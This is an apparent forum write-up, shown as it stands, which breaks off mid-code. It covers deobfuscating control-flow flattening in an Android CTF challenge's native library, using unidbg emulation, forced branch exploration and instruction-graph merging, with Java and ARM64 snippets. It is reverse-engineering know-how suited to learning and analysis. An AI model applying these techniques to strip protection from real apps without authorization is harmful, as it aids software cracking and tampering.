<img src="https://wechat2rss.xlab.app/img-proxy/?k=65b8e5d8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZK4gvr8ibeSZD6JKaUicbVf7Trdptmv8iczyxicIVkWv5dpMUm3MRGb6DQNkiapNGSG7icTPPTzU4r56ibAQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>circle2</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>春节期间就已经看到红包活动了，但是感觉自己完成时间比较长，当时就没做。后面断断续续做了 Android 这边的题目，还是学习到很多东西的。论坛上有许多红包活动解题的文章，Android的高级题只有一个，所以解的过程还是很有记录和分享的价值的。</p><p>这篇文章主要是记录Android高级题控制流平坦化反混淆的思路和一些实现，现在实现还有缺陷，另外目标并不是高级题flag的获取，因为还未分析完成，所以后续可能会重新编辑本文，进行更新</p><p>使用的是unidbg，目前可以已经验证可以反混淆的（2024-06-23）：</p><ul><li style="margin-left: 2px;"><p>checkSn函数 -- 0x1befc</p></li><li style="margin-left: 2px;"><p>base64的函数 -- 0x24290</p></li><li style="margin-left: 2px;"><p>0x1e924（这个函数还有问题，只有前半部分是正常的）</p></li></ul><p>简单看一下效果（这里是最外层函数0x1befc），左边是进行一些简单patch之后的效果，可以看出是控制流平坦化的特征，右边是进行反混淆之后的结果</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=caae77bf&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZK4gvr8ibeSZD6JKaUicbVf7T3tRU5PGVjSRhAUTOIxqoeRIo9HMm8ZPWXWXm67djj5PBOe2dv1klbg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>样本中控制流平坦化控制块是这样的，前面部分和以前了解过的控制流平坦化差不多，但是跳转地址是动态计算的，所以我们无法看清楚方法的全貌。在 爱破解 2024 春节红包活动WP(全，含 Android 高级题) 文章中对 Android 高级题的处理主要是 1c110 处修改 nzcv 寄存器，1c11c 获取 x10 中的地址，这样就能获取符合 lt 以及不符合 lt 的跳转地址，再进行 patch 即可。</p><p>我也这样处理试了一下，我认为有一个缺点，由于还是几乎按照正常执行逻辑进行处理的，所以修改完成后会出现一些未被 patch 的逻辑，经常需要再补</p><p>另外这样是进行了简单的 patch，所以修复完成后，它只是回归到了正常的控制流平坦化的样子了，反编译得到的代码还需要进一步处理，为此我写了一个小工具获得当前块的下一个块，但是块之间的连接还是需要再进行处理，还是挺耗时间的</p><blockquote><p style="margin-bottom: 15px;">这里我用的是 ghidra, 它的 image base 是 0x100000，所以这里实际偏移是 0x1c0fc, 0x1c100, ...</p></blockquote><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">0</span>fc <span style="color: rgb(255, 115, 253);">6</span>a <span style="color: rgb(255, 115, 253);">52</span> <span style="color: rgb(255, 115, 253);">82</span> <span style="color: rgb(255, 115, 253);">52</span>     mov        w<span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">1293</span><br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">100</span> ea <span style="color: rgb(255, 115, 253);">0</span>b b<span style="color: rgb(255, 115, 253);">7</span> <span style="color: rgb(255, 115, 253);">72</span>     movk       w<span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(198, 197, 254);">#0</span>xb<span style="color: rgb(255, 115, 253);">85</span>f, LSL <span style="color: rgb(198, 197, 254);">#16</span><br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">104</span> <span style="color: rgb(255, 115, 253);">1</span>f <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">0</span>a <span style="color: rgb(255, 115, 253);">6</span>b     cmp        w<span style="color: rgb(255, 115, 253);">8</span>, w<span style="color: rgb(255, 115, 253);">10</span><br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">108</span> <span style="color: rgb(255, 115, 253);">0</span>a <span style="color: rgb(255, 115, 253);">0</span>a <span style="color: rgb(255, 115, 253);">80</span> <span style="color: rgb(255, 115, 253);">52</span>     mov        w<span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">50</span><br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">10</span><span style="color: rgb(150, 203, 254);">c</span> <span style="color: rgb(255, 115, 253);">0</span>b <span style="color: rgb(255, 115, 253);">23</span> <span style="color: rgb(255, 115, 253);">80</span> <span style="color: rgb(255, 115, 253);">52</span>     mov        w<span style="color: rgb(255, 115, 253);">11</span>, <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">118</span><br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">110</span> <span style="color: rgb(255, 115, 253);">6</span>a b<span style="color: rgb(255, 115, 253);">1</span> <span style="color: rgb(255, 115, 253);">8</span>a <span style="color: rgb(255, 115, 253);">9</span>a     csel       <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">11</span>, <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span>, lt<br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">114</span> <span style="color: rgb(255, 115, 253);">2</span>a <span style="color: rgb(255, 115, 253);">69</span> <span style="color: rgb(255, 115, 253);">6</span>a f<span style="color: rgb(255, 115, 253);">8</span>     ldr        <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span>, [<span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">9</span>, <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span>, LSL <span style="color: rgb(198, 197, 254);">#0</span><span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">0</span>]<br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">118</span> <span style="color: rgb(255, 115, 253);">4</span>a <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">0</span>e <span style="color: rgb(255, 115, 253);">8</span>b     <span style="color: rgb(150, 203, 254);">add</span>        <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">14</span><br />  <span style="color: rgb(255, 115, 253);">0011</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(150, 203, 254);">c</span> <span style="color: rgb(255, 115, 253);">40</span> <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">1</span>f d<span style="color: rgb(255, 115, 253);">6</span>     <span style="color: rgb(150, 203, 254);">br</span>         <span style="color: rgb(150, 203, 254);">x</span><span style="color: rgb(255, 115, 253);">10</span></code></pre><p>下面介绍反混淆的思路，反混淆的方法是在 爱破解 2024 春节红包活动WP(全，含 Andro高级题) 和 利用angr符号执行去除控制流平坦化 基础上改进的</p><h2>探索</h2><p>这里需要首先介绍一个思路：探索。</p><p>将一个方法简化之后，其实就两部分，一是顺序执行，二是分支。如果将分支看作节点，以及节点的 true 和 false 后的执行部分看作两个分支，那么整个方法就是一个二叉树的结构，那么通过强制修改节点位置的 nzcv 寄存器，遍历这个二叉树其实是可能的。正常程序是不需要这样做的，但是这个样本中，由于控制流平坦化的跳转动态计算，无法直接看清全貌，那么就可以通过这样的遍历，建立起方法的全貌，而这样的遍历，我称为探索。</p><p>方法看作二叉树其实是简化的，实际可能是个图，因为它是可能存在循环的。另外强制修改 nzcv 寄存器来改变它的分支，可能存在执行错误，比如 read memory failed。</p><h2>控制流平坦化的反混淆思路</h2><p>另外这里简单介绍一下控制流平坦化的反混淆思路</p><ol><li style="margin-left: 2px;"><p>区分出入口块，返回块，预分发器，主分发器，子分发器，真实块</p></li><li style="margin-left: 2px;"><p>获取真实块之间的前后关系</p></li><li style="margin-left: 2px;"><p>进行patch</p></li></ol><p>下面是反混淆的具体步骤，相对重要的是1和7，代码本身只有两个文件：</p><ol><li style="margin-left: 2px;"><p>Test.java：主要是unidbg模拟执行的逻辑，1和5才会涉及到，hook时会调用 InstructionGraph.java 记录指令</p></li><li style="margin-left: 2px;"><p>InstructionGraph.java: 包含指令合并，控制流平坦化块的区分，以及最终的 patch 输出</p></li></ol><h2>1. 初步探索</h2><p>探索其实就是遍历二叉树的一个过程，每探索一个分支就重新执行一遍程序。之前实现过一次执行，以及仅重复执行方法，均有问题。所以每次探索一个分支就跑一遍 unidbg 的 emulator build，load library，这样处理是最方便的。此外就是探索过程要实际做的事情：获取指令之间的前后顺序</p><h3>1.1 遍历的整体逻辑</h3><p>path是一个Node List，node中包含的信息是 address 和 cond，表示涉及判断，即获取 NZCV 寄存器指令的地址，以及当时应选择的指令条件满足的状态，true 还是 false</p><ol><li style="margin-left: 2px;"><p>状态重置。这里是探索的代码以及 unidbg 的一些代码混在一块了，所以每次探索前需要将状态重置。这是因为之前尝试仅重复执行方法遗留的代码框架，就没做大的改动，理论上分开是更好的</p></li><li style="margin-left: 2px;"><p>进行当前 path 的探索。path最初是空的，我们也没有提前知道相应指令的地址，走指定的 path，那么这个 path 应该有多长，这些问题都是未知的。所以我这里采取的方法是，执行方法时，尽可能的往前探索未知的节点，未知的节点条件都走 true</p></li><li style="margin-left: 2px;"><p>其他分支的探索。第二步探索之后，会新增一些为true的节点，将末尾转化为false，就可以探索令一条分支了，下面演示以下</p></li></ol><p>入参path：node1-true, node2-false, node3-false</p><p>单次探索结果，也相当与这个新增全 true 的分支走过去了：node1-true, node2-false, node3-false, node4-true, node5-true, node6-true</p><p>那么需要探索的其他分支是：</p><p>explorer(node1-true, node2-false, node3-false, node4-true, node5-true, node6-false)</p><p>explorer(node1-true, node2-false, node3-false, node4-true, node5-false)</p><p>explorer(node1-true, node2-false, node3-false, node4-false)</p><p>再往前就归属于不属于传入 path 的范畴了，所以当前 path 的探索就结束了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">explorer</span>(List&lt;Node&gt; path) {<br />    <span style="color: rgb(146, 255, 184);">// 每次探索前的准备</span><br />    <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">origin</span> = path.toString();<br />    <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">originSize</span> = path.size();    this.currentPath = path;<br />    this.curNodeIndex = <span style="color: rgb(255, 115, 253);">0</span>;<br />    this.accessedNodeInCommonBlock = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();    this.explorerStatus = Status.RUNNING;<br />    this.accessedInstructions = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br />    this.accessedRealInstructions = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br />    this.accessedStartInstructions = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br />    <span style="color: rgb(146, 255, 184);">// 进行单次探索</span><br />    <span style="color: rgb(150, 203, 254);">try</span> {        this.init();        this.checkSn();<br />    } <span style="color: rgb(150, 203, 254);">catch</span> (Exception ignored) {}<br />    <span style="color: rgb(150, 203, 254);">try</span> {        this.destory();<br />    } <span style="color: rgb(150, 203, 254);">catch</span> (IOException e) {<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(e);    }<br />    System.out.println(<span style="color: rgb(168, 255, 96);">"origin path: "</span> + origin);<br />    System.out.println(<span style="color: rgb(168, 255, 96);">"result path: "</span> + this.currentPath);<br />    System.out.println(<span style="color: rgb(168, 255, 96);">"---------------------"</span>);<br />    <span style="color: rgb(146, 255, 184);">// 进行其他分支的探索</span>    List&lt;Node&gt; tmpPath = this.currentPath;<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = tmpPath.size() - <span style="color: rgb(255, 115, 253);">1</span>; i &gt;= originSize; i--) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (tmpPath.get(i).cond) {<br />            List&lt;Node&gt; newPath = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">j</span> = <span style="color: rgb(255, 115, 253);">0</span>; j &lt; i; j++) {<br />                newPath.add(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Node</span>(tmpPath.get(j).address, tmpPath.get(j).cond));            }<br />            newPath.add(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Node</span>(tmpPath.get(i).address, <span style="color: rgb(198, 197, 254);">false</span>));            explorer(newPath);        }    }}<br /><span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">Node</span> {<br />    <span style="color: rgb(255, 255, 182);">long</span> address;<br />    <span style="color: rgb(255, 255, 182);">boolean</span> cond;<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">Node</span>(<span style="color: rgb(255, 255, 182);">long</span> address, <span style="color: rgb(255, 255, 182);">boolean</span> cond) {        this.address = address;        this.cond = cond;    }<br />    <span style="color: rgb(146, 255, 184);">@Override</span><br />    <span style="color: rgb(150, 203, 254);">public</span> String <span style="color: rgb(255, 255, 182);">toString</span>() {<br />        <span style="color: rgb(150, 203, 254);">return</span> String.format(<span style="color: rgb(168, 255, 96);">"%x %s"</span>, address, cond);    }<br />}</code></pre><h3>1.2 新分支的探索</h3><p>这一块是 <code style="font-family: SFMono-Regular, Consolas, ;">emulator.getBackend().hook_add_new</code> 的 <code style="font-family: SFMono-Regular, Consolas, ;">CodeHook()</code> 中的内容，每次碰到 nzcv 节点进行如下处理：</p><ul><li style="margin-left: 2px;"><p>获取 cpsr，指令中的cond string，然后得到当前是符合条件还是不符合条件</p></li><li style="margin-left: 2px;"><p>如果 index 还在 path 内，就按照 path 中的 cond 修改</p></li><li style="margin-left: 2px;"><p>如果不再 path 内，则修改为 true，同时创建新的节点添加到 path 中</p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">condStr</span> = getCond(ins);<br /><span style="color: rgb(255, 255, 182);">Cpsr</span> <span style="color: rgb(198, 197, 254);">cpsr</span> = Cpsr.getArm64(backend);<br /><span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(198, 197, 254);">cond</span> = isCondSuc(condStr, cpsr);<br /><span style="color: rgb(150, 203, 254);">if</span> (curNodeIndex &lt; currentPath.size() &amp;&amp; currentPath.get(curNodeIndex).address != offset) {<br />    System.err.println(String.format(<span style="color: rgb(168, 255, 96);">"Unexpected address: %X %s %s"</span>, address, ins, currentPath));}<br /><span style="color: rgb(150, 203, 254);">if</span> (curNodeIndex &lt; currentPath.size() &amp;&amp; currentPath.get(curNodeIndex).cond != cond) {    toggleCpsrStatus(condStr, cpsr);}<br /><span style="color: rgb(150, 203, 254);">if</span> (curNodeIndex &gt;= currentPath.size()) {<br />    <span style="color: rgb(150, 203, 254);">if</span> (!cond) {        toggleCpsrStatus(condStr, cpsr);    }<br />    <span style="color: rgb(146, 255, 184);">// 新节点处理true的情况</span><br />    currentPath.add(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Node</span>(offset, <span style="color: rgb(198, 197, 254);">true</span>));<br />}</code></pre><h3>1.3 记录指令之间的连接</h3><p>在hook方法中：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">if</span> (!accessedInstructions.isEmpty()) {<br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">last</span> = accessedInstructions.get(accessedInstructions.size() - <span style="color: rgb(255, 115, 253);">1</span>);    instructionGraph.addLink(last, ins);}<br />accessedInstructions.add(ins);</code></pre><p>在 InstructionGraph 中，这是创建用于处理指令图的类，同时在里面做了后续的控制流平坦化的相关处理</p><p>这部分应该比较简单，就是将 node 和 link 储存起来。这里通过 address 来判断是否重复，因为同一 address 的 Instruction 判断好像是不等的，所以 Set 处理不了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> Set&lt;Instruction&gt; nodes = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">private</span> Map&lt;Long, List&lt;Instruction&gt;&gt; toMap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">private</span> Map&lt;Long, List&lt;Instruction&gt;&gt; fromMap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addLink</span>(Instruction ins, Instruction to) {    addNode(ins);    addNode(to);    putLinkToMap(toMap, ins.getAddress(), to);    putLinkToMap(fromMap, to.getAddress(), ins);}<br /><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addNode</span>(Instruction ins) {<br />    <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(198, 197, 254);">include</span> = <span style="color: rgb(198, 197, 254);">false</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : nodes)<br />        <span style="color: rgb(150, 203, 254);">if</span> (i.getAddress() == ins.getAddress()) {<br />            include = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;        }<br />    <span style="color: rgb(150, 203, 254);">if</span> (!include)        nodes.add(ins);}<br /><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">putLinkToMap</span>(Map&lt;Long, List&lt;Instruction&gt;&gt; map, <span style="color: rgb(255, 255, 182);">long</span> address, Instruction ins) {<br />    <span style="color: rgb(150, 203, 254);">if</span> (!map.containsKey(address)) {<br />        map.put(address, <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;());    }<br />    <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(198, 197, 254);">include</span> = <span style="color: rgb(198, 197, 254);">false</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : map.get(address))<br />        <span style="color: rgb(150, 203, 254);">if</span> (i.getAddress() == ins.getAddress()) {<br />            include = <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">break</span>;        }<br />    <span style="color: rgb(150, 203, 254);">if</span> (!include)        map.get(address).add(ins);<br />}</code></pre><h3>1.4 避免死循环</h3><p>需要在两个层面避免</p><ol><li style="margin-left: 2px;"><p>避免 path 中已经出现过的节点再次出现，重复出现直接退出</p></li><li style="margin-left: 2px;"><p>避免节点之间的 instruction 出现死循环，重复出现直接退出</p></li></ol><p>将PC改成一个不正确的数字，就会退出，我这里是改成了-1</p><p>下面是 <code style="font-family: SFMono-Regular, Consolas, ;">CodeHook</code> 中的代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// 将PC随便设置个数字，就会异常退出</span><br /><span style="color: rgb(150, 203, 254);">if</span> (explorerStatus != Status.RUNNING) {<br />    emulator.getBackend().reg_write(Arm64Const.UC_ARM64_REG_PC, -<span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span>;}<br /><span style="color: rgb(146, 255, 184);">// 判断之前的指令是否出现过</span><br /><span style="color: rgb(150, 203, 254);">for</span> (Instruction i : accessedInstructions)<br />    <span style="color: rgb(150, 203, 254);">if</span> (i.getAddress() == address) {<br />        <span style="color: rgb(146, 255, 184);">// 死循环的需要正确串起来，所以这里需要加ins</span>        accessedInstructions.add(ins);        explorerStatus = Status.INFINITE_LOOP;<br />        <span style="color: rgb(150, 203, 254);">return</span>;    }<br /><span style="color: rgb(146, 255, 184);">// 添加新遍历过的指令</span>accessedInstructions.add(ins);<br /><span style="color: rgb(146, 255, 184);">// 判断节点是否重复</span><br /><span style="color: rgb(255, 255, 182);">short</span>[] read = ins.regsAccess().getRegsRead();<br /><span style="color: rgb(150, 203, 254);">if</span> (hasNZCV(ins, read)) {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; currentPath.size(); i++)<br />        <span style="color: rgb(150, 203, 254);">if</span> (i != curNodeIndex &amp;&amp; currentPath.get(i).address == offset) {            explorerStatus = Status.INFINITE_LOOP;<br />            <span style="color: rgb(150, 203, 254);">return</span>;        }<br />}</code></pre><h3>1.5 避免重复探索</h3><p>如果一个节点 true 和 false 均探索完成，那么就没有必要再继续探索了，下次碰到直接退出即可</p><p>这个可以极大的加快探索的速度，但是可能会引起探索不够充分的问题，代码比较乱，暂时不贴</p><h2>2. 合并块</h2><p>合并指令为块，其实相对简单，通过遍历之前存下的指令先后顺序即可创建出来</p><ol><li style="margin-left: 2px;"><p>首先找到entry，即没有from的指令</p></li><li style="margin-left: 2px;"><p>设置一个栈，储存待处理的指令（这些指令会是每个块的首个指令）</p></li><li style="margin-left: 2px;"><p>从栈中取指令，判断是否可以 merge，可以 merge 的标准是，指令之间地址是相连的，而且指令1的 to 只有指令2，指令2的 from 只有指令1</p></li><li style="margin-left: 2px;"><p>直到找到不可 merge 的，将刚刚遍历过去的合在一起，放置到 mergeNodes 中</p></li><li style="margin-left: 2px;"><p>同时将最后的节点的所有 to 放入栈中</p></li></ol><p>此外，需要一个 accessed 来保证不重复，确保不会陷入死循环中</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// Set还是List其实没有关系，最终都是通过遍历判断地址是否相同来保证唯一的</span><br /><span style="color: rgb(150, 203, 254);">private</span> Set&lt;List&lt;Instruction&gt;&gt; mergedNodes = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">findEntry</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : nodes) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (i.getAddress() == <span style="color: rgb(255, 115, 253);">0x1befc</span> + moduleBase) {            System.out.println(fromMap.containsKey(i.getAddress()));        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (!fromMap.containsKey(i.getAddress())) {            entry = i;        }    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (entry == <span style="color: rgb(198, 197, 254);">null</span>) {<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"entry is null"</span>);    }}<br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">mergeNodes</span>(<span style="color: rgb(255, 255, 182);">boolean</span> isFirst) {<br />    Set&lt;Long&gt; accessed = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    Stack&lt;Instruction&gt; pending = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Stack</span>&lt;&gt;();<br />    <span style="color: rgb(146, 255, 184);">// 前一个区块的最后一个地址对应的node，相当于包含了link的信息</span><br />    List&lt;Link&gt; graphLinkMap = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();    pending.push(entry);    accessed.add(entry.getAddress());<br />    <span style="color: rgb(150, 203, 254);">while</span> (!pending.empty()) {<br />        <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">ins</span> = pending.pop();        List&lt;Instruction&gt; from = fromMap.get(ins.getAddress());<br />        List&lt;Instruction&gt; mergedNode = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();        mergedNode.add(ins);<br />        <span style="color: rgb(150, 203, 254);">while</span> (canMerge(ins)) {<br />            ins = toMap.get(ins.getAddress()).get(<span style="color: rgb(255, 115, 253);">0</span>);            mergedNode.add(ins);        }        mergedNodes.add(mergedNode);<br />        <span style="color: rgb(150, 203, 